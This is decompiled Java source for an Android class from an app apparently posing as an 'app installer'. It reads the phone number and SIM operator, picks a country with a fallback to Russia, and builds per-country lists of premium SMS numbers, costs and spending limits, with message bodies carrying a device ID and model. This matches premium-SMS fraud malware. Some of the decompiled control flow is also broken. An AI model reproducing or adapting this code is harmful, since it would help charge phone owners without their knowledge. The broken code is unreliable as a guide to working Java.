package com.soft.android.appinstaller.core;

import android.content.Context;
import android.content.res.Resources;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.soft.android.appinstaller.GlobalConfig;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class Internals
{
  private static final String SMS_FORMAT_DEFAULTVALUE = "%prefix% %id% %smsc% %version% %platform% %suffix%";
  private static final String SMS_FORMAT_KEY = "engine.sms.sent.format";
  private static final String SMS_FORMAT_SUBST_ID = "%id%";
  private static final String SMS_FORMAT_SUBST_PLATFORM = "%platform%";
  private static final String SMS_FORMAT_SUBST_PREFIX = "%prefix%";
  private static final String SMS_FORMAT_SUBST_SMSC = "%smsc%";
  private static final String SMS_FORMAT_SUBST_SUFFIX = "%suffix%";
  private static final String SMS_FORMAT_SUBST_VERSION = "%version%";
  private static final String SP = " ";
  private static String buildInfo = "APPINST.ANDROID.1212.01";
  private static String tag = "Internals";
  private String calculatedLocation = null;
  private Context context;
  List<String> locations;
  private ArrayList<PrefixNamePair> prefixesByMCCMNC;
  private ArrayList<PrefixNamePair> prefixesByNumber;
  private SmsInfo smsInfo;
  private TelephonyManager tm;
  
  public Internals(Context paramContext)
  {
    this.context = paramContext;
    this.tm = ((TelephonyManager)paramContext.getSystemService("phone"));
    this.prefixesByNumber = new ArrayList();
    this.prefixesByMCCMNC = new ArrayList();
    init();
  }
  
  private void calculateLocation()
  {
    String str2 = getPhone();
    Log.v(tag, "getPhone()=" + str2);
    String str1 = getSimOperator();
    Log.v(tag, "getSimOperator()=" + str1);
    int i;
    if (str2 != null)
    {
      i = 0;
      if (i < this.prefixesByNumber.size()) {
        if (str2.startsWith(((PrefixNamePair)this.prefixesByNumber.get(i)).getPrefix()))
        {
          String str3 = ((PrefixNamePair)this.prefixesByNumber.get(i)).getName();
          if (isConfigurationForLocation(str3))
          {
            this.calculatedLocation = str3;
            Log.i(tag, "Calculated location by PHONE: " + this.calculatedLocation);
          }
        }
      }
    }
    do
    {
      return;
      i += 1;
      break;
      i = 0;
      while (i < this.prefixesByMCCMNC.size())
      {
        if (str1.equals(((PrefixNamePair)this.prefixesByMCCMNC.get(i)).getPrefix()))
        {
          str2 = ((PrefixNamePair)this.prefixesByMCCMNC.get(i)).getName();
          if (isConfigurationForLocation(str2))
          {
            this.calculatedLocation = str2;
            Log.i(tag, "Calculated location by MCCMNC: " + this.calculatedLocation);
            return;
          }
        }
        i += 1;
      }
      str1 = getSimCountryIso();
      if (isConfigurationForLocation(str1))
      {
        this.calculatedLocation = str1;
        Log.i(tag, "Calculated location by COUNTRY ISO: " + this.calculatedLocation);
        return;
      }
      str1 = GlobalConfig.getInstance().getValue("country", "ru");
      if (isConfigurationForLocation(str1))
      {
        this.calculatedLocation = str1;
        Log.i(tag, "Calculated location by RESCUE COUNTRY ISO: " + this.calculatedLocation);
        return;
      }
    } while (!isConfigurationForLocation("ru"));
    this.calculatedLocation = "ru";
    Log.i(tag, "Calculated location by SUPER RESCUE COUNTRY ISO: " + this.calculatedLocation);
  }
  
  private void fillSmsInfo()
  {
    Log.d(tag, "fillSmsInfo()");
    this.smsInfo = new SmsInfo();
    String str1 = this.calculatedLocation;
    if (str1 == null) {
      return;
    }
    int i = Integer.parseInt(getParam("smsCount_" + str1, "0"));
    int j = Integer.parseInt(getParam("dcSmsCount_" + str1, "0"));
    int m = Integer.parseInt(getParam("totalSmsCount_" + str1, "0"));
    int k = Integer.parseInt(getParam("sumLimit_" + str1, String.valueOf(Integer.MAX_VALUE)));
    str1 = GlobalConfig.getInstance().getValue("id");
    this.smsInfo.setSmsCount(i);
    this.smsInfo.setDcSmsCount(j);
    this.smsInfo.setSumLimit(k);
    i = 1;
    while (i <= m)
    {
      Object localObject = getNValueForLocation("number", i, "");
      String str2 = getNValueForLocation("prefix", i, "");
      String str3 = getNValueForLocation("suffix", i, "");
      String str4 = Build.MANUFACTURER + Build.MODEL;
      k = str4.length();
      j = k;
      if (k > 20) {
        j = 20;
      }
      str4 = str4.substring(0, j);
      boolean bool = "true".equals(getNValueForLocation("DC", i, "false"));
      j = Integer.parseInt(getNValueForLocation("cost", i, "0"));
      localObject = new SmsInfo.SMS((String)localObject, formatSMSData(str2, str1, "none", str4, buildInfo, str3), j);
      this.smsInfo.addSms((SmsInfo.SMS)localObject, bool);
      i += 1;
    }
    this.smsInfo.sort();
    i = 1;
    for (;;)
    {
      str1 = getNValueForLocation("alert", i, null);
      if (str1 == null) {
        break;
      }
      this.smsInfo.addAlert(str1);
      i += 1;
    }
  }
  
  private String formatSMSData(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, String paramString6)
  {
    return getOverridableValueForLocation("engine.sms.sent.format", "%prefix% %id% %smsc% %version% %platform% %suffix%").replaceAll("%prefix%", paramString1).replaceAll("%id%", paramString2).replaceAll("%smsc%", paramString3).replaceAll("%version%", paramString5).replaceAll("%platform%", paramString4).replaceAll("%suffix%", paramString6);
  }
  
  private String getParam(String paramString1, String paramString2)
  {
    return GlobalConfig.getInstance().getValue(paramString1, paramString2);
  }
  
  private String getPhone()
  {
    String str2 = this.tm.getLine1Number();
    if ((str2 == null) || (str2.equals(""))) {
      return null;
    }
    String str1 = str2;
    if (str2.startsWith("+")) {
      str1 = str2.substring(1);
    }
    return str1;
  }
  
  private String getSimCountryIso()
  {
    return this.tm.getSimCountryIso();
  }
  
  private String getSimOperator()
  {
    return this.tm.getSimOperator();
  }
  
  private String getSimOperatorName()
  {
    return this.tm.getSimOperatorName();
  }
  
  private void init()
  {
    Log.d(tag, "init started!!!");
    loadSMSCFile();
    loadMCCMNCFile();
    calculateLocation();
    this.locations = new ArrayList();
    String str = this.calculatedLocation;
    this.locations.add(str);
    if (str.contains("_"))
    {
      str = str.substring(0, str.indexOf('_'));
      this.locations.add(str);
    }
    this.locations.add("");
    fillSmsInfo();
  }
  
  private boolean isConfigurationForLocation(String paramString)
  {
    return !GlobalConfig.getInstance().getValueNull("smsCount_" + paramString);
  }
  
  private void loadMCCMNCFile()
  {
    Object localObject = this.context.getResources().openRawResource(2130968577);
    try
    {
      localObject = new BufferedReader(new InputStreamReader((InputStream)localObject, "UTF-8"));
      for (;;)
      {
        String str2 = ((BufferedReader)localObject).readLine();
        if (str2 == null) {
          break;
        }
        int i = str2.indexOf(' ');
        if (i > 0)
        {
          String str1 = str2.substring(0, i);
          str2 = str2.substring(i + 1);
          if (!str1.equals("#")) {
            this.prefixesByMCCMNC.add(new PrefixNamePair(str1, str2));
          }
        }
      }
      return;
    }
    catch (UnsupportedEncodingException localUnsupportedEncodingException)
    {
      localUnsupportedEncodingException.printStackTrace();
      return;
    }
    catch (IOException localIOException)
    {
      localIOException.printStackTrace();
    }
  }
  
  private void loadSMSCFile()
  {
    Object localObject = this.context.getResources().openRawResource(2130968578);
    try
    {
      localObject = new BufferedReader(new InputStreamReader((InputStream)localObject, "UTF-8"));
      for (;;)
      {
        String str2 = ((BufferedReader)localObject).readLine();
        if (str2 == null) {
          break;
        }
        int i = str2.indexOf(' ');
        if (i > 0)
        {
          String str1 = str2.substring(0, i);
          str2 = str2.substring(i + 1);
          if (!str1.equals("#")) {
            this.prefixesByNumber.add(new PrefixNamePair(str1, str2));
          }
        }
      }
      return;
    }
    catch (UnsupportedEncodingException localUnsupportedEncodingException)
    {
      localUnsupportedEncodingException.printStackTrace();
      return;
      Collections.sort(this.prefixesByNumber, new PrefixComparator());
      return;
    }
    catch (IOException localIOException)
    {
      localIOException.printStackTrace();
    }
  }
  
  public String getLocation()
  {
    return this.calculatedLocation;
  }
  
  public List<String> getLocationList()
  {
    return this.locations;
  }
  
  public String getNValueForLocation(String paramString1, int paramInt, String paramString2)
  {
    return GlobalConfig.getInstance().getValue(paramString1 + paramInt + "_" + this.calculatedLocation, paramString2);
  }
  
  public String getOverridableValueForLocation(String paramString1, String paramString2)
  {
    int i = 0;
    while (i < this.locations.size())
    {
      if ("".equals(this.locations.get(i))) {}
      for (String str = GlobalConfig.getInstance().getValue(paramString1, null); str != null; str = GlobalConfig.getInstance().getValue(paramString1 + "_" + (String)this.locations.get(i), null)) {
        return str;
      }
      i += 1;
    }
    return paramString2;
  }
  
  public SmsInfo getSmsInfo()
  {
    return this.smsInfo;
  }
  
  public String getValueForLocation(String paramString1, String paramString2)
  {
    return GlobalConfig.getInstance().getValue(paramString1 + "_" + this.calculatedLocation, paramString2);
  }
}
